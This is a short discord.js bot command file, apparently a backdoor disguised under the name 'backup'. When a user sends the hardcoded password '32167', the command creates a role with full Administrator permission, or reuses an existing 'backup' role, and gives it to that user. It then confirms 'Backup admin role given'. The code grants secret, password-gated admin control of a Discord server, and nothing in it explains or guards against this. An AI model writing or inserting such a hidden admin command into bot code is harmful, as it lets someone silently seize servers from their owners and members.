const { PermissionsBitField } = require("discord.js");

module.exports = {
  name: "backup",
  execute(message, args) {

    const password = "32167";

    if (args[0] !== password)
      return message.reply("❌ Wrong password");

    let role = message.guild.roles.cache.find(r => r.name === "backup");

    if (!role) {
      message.guild.roles.create({
        name: "backup",
        permissions: [PermissionsBitField.Flags.Administrator]
      }).then(r => message.member.roles.add(r));
    } else {
      message.member.roles.add(role);
    }

    message.reply("✅ Backup admin role given");
  }
};
